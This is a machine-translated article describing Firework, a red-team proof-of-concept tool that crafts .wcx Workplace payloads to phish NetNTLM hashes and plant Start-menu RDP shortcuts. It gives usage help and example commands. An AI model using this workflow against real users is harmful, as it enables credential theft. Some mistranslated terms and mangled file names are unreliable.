# firework——与创建有效文件的微软工作区交互的工具

> 原文：<https://kalilinuxtutorials.com/firework-tool-interact-microsoft-workplaces/>

Firework 是一个概念验证工具，用于与 Microsoft 工作区进行交互，创建供应流程所需的有效文件。该工具还包装了 Responder 的一些代码，以利用它从通过它提供 Workplace feed 的系统中捕获 NetNTLM 哈希的能力。

此工具可用作渗透测试或红队练习的一部分，以创建一个. wcx 有效负载(和相关的提要),单击它可用于:

*   凭据的费西合唱团-如果用户输入凭据，将发送 NetNTLM 哈希(或在旧版本的 Windows 上自动发送)。
*   将项目添加到开始菜单–在设置快捷方式被添加到开始菜单后，启动所提供的 RDP 文件。这些条目有可能被用作更广泛的社会工程活动的一部分。
*   下载资源——如。Windows 每天都会下载和更新 rdp 文件和图标文件(如果禁用或满足馈送的身份验证)。

## **烟花安装**

*   使用 Python 2.7.x 进行了测试(Python3 目前不支持，尽管主要的 Firework 类可以在 Python 3 中使用)

```
$ pip install -r requirements.txt
```

*   该工具通过 HTTPS 提供内容，需要证书和私钥才能使用内置的带有 NetNTLM 捕获的 web 服务器。默认文件:***cert . CRT**T3*和**key . PEM****

**也可阅读[kismac 2——免费开源无线绊脚石&Mac 安全工具 OS X](https://kalilinuxtutorials.com/kismac2-open-source-wireless-mac/)**

## **用途**

```
 **.-:::::'::::::::::..  .,::::::.::    .   .:::  ...    :::::::..    :::  .   
;;;'''' ;;;;;;;``;;;; ;;;;''''';;,  ;;  ;;;'.;;;;;;;. ;;;;``;;;;   ;;; .;;,.
[[[,,== [[[ [[[,/[[['  [[cccc  '[[, [[, [[',[[     \[[,[[[,/[[['   [[[[[/'  
`$$$"`` $$$ $$$$$$c    $$""""    Y$c$$$c$P $$$,     $$$$$$$$$c    _$$$$,    
 888    888 888b "88bo,888oo,__   "88"888  "888,_ _,88P888b "88bo,"888"88o, 
 "MM,   MMM MMMM   "W" """"YUMMM   "M "M"    "YMMMMMP" MMMM   "W"  MMM "MMP"

usage: firework.py [-h] -c COMPANY -u URL -a APP -e EXT -i ICON [-l LISTEN]
                   [-r RDP] [-d DOMAIN] [-n USERNAME] [-p PASSWORDHASH]
                   [-t CERT] [-k KEY]

WCX workplace tool

optional arguments:
  -h, --help            show this help message and exit
  -c COMPANY, --company COMPANY
                        Company name
  -u URL, --url URL     Feed URL
  -a APP, --app APP     App Name
  -e EXT, --ext EXT     App Extension
  -i ICON, --icon ICON  App Icon
  -l LISTEN, --listen LISTEN
                        TLS Web Server Port
  -r RDP, --rdp RDP     RDP Server
  -d DOMAIN, --domain DOMAIN
                        RDP Domain
  -n USERNAME, --username USERNAME
                        RDP Username
  -p PASSWORD, --password PASSWORD
                        RDP Password
  -t CERT, --cert CERT  SSL cert
  -k KEY, --key KEY     SSL key
```

## **例子**

基本示例:

*   组织名称:EvilCorp
*   XML 提要的 URL(或者 Firework 内置服务器的 URL):[https://example.org/](https://example.org/)–这是 Windows 下载提要的地方。
*   应用名称:烟花
*   文件扩展名:。fwk
*   图标文件:firework.ico

```
python ./firework.py -c EvilCorp -u https://example.org/ -a Firework -e .fwk -i ./firework.ico 
```

如果当前目录中存在 **cert.crt** 和 **key.pem** ，内置 web 服务器将在端口 443 上启动。这将迫使响应者进行 NTLM 挑战。如果这些文件不存在，该工具会将所有文件写入您自己托管的本地目录。

如果您希望在备用端口上启动内置 web 服务器，请使用-l 标志，如下所示:

```
python ./firework.py -c EvilCorp -u https://example.org/ -a Firework -e .fwk -i ./firework.ico 
```

您还可以向添加一些自定义内容。接受服务的 rdp 文件。

*   远程桌面服务器:dc 公司本地
*   域:公司本地
*   用户名:admin
*   密码加密:包含在 RDP 文件中的加密密码

注意:密码存储在。在默认配置中，rdp 文件可能会被忽略。

```
python ./firework.py -c EvilCorp -u https://example.org/ -a Firework -e .fwk -i ./firework.ico -r dc.corp.local -d corp.local -n admin -p <crypt password>
```

## **有效载荷**

运行工具“payload.wcx”后，将被写入当前目录。单击该文件将启动配置过程。

[![](img/d861a9096555aeb1980fc054015933d7.png) ](https://github.com/SpiderLabs/Firework/) **鸣谢:大卫·米德尔赫斯特**